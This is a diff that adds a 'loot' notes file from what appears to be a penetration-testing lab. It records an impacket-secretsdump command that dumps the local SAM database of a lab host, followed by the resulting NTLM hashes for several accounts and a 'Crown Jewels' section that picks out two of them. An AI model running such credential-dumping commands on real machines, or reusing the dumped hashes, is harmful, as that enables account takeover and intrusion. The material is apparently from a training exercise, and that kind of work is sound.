@@ -1,0 +1,13 @@
+# Loot Lab-02 SILENT BRIDGE — SAM dump via secretsdump
+# Obtenido via: impacket-secretsdump -sam SAM -system SYSTEM LOCAL (PC-01 10.0.3.20)
+
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrador:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Invitado:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:8ab6ae88bcb644f4ed59bc0f35a0cdad:::
+PC-01:1001:aad3b435b51404eeaad3b435b51404ee:b73fdfe10e87b4ca5c0d957f81de6863:::
+thomas:1002:aad3b435b51404eeaad3b435b51404ee:e1168d5763d3da51868e0fefc70d18e8:::
+
+# Crown Jewels
+# thomas NTLM : e1168d5763d3da51868e0fefc70d18e8
+# PC-01  NTLM : b73fdfe10e87b4ca5c0d957f81de6863
